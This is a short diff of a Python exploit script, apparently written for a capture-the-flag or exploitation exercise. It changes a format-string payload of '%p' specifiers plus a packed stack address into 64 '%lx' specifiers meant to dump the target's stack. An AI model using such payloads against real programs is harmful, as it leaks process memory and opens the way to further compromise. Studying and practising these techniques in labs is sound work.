@@ -6,8 +6,8 @@ import struct
 def p(x): return struct.pack('<Q', x)
 def printable(x): return (x >= 0x20 and x <= 0x7e)
 
-payload = b'%p %p %p %p %p %p %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p    '
-payload += p(0x7fffffffe4b0)
+# dump the entire stack
+payload = b'%lx ' * 64
 
 for p in payload:
     if printable(p):
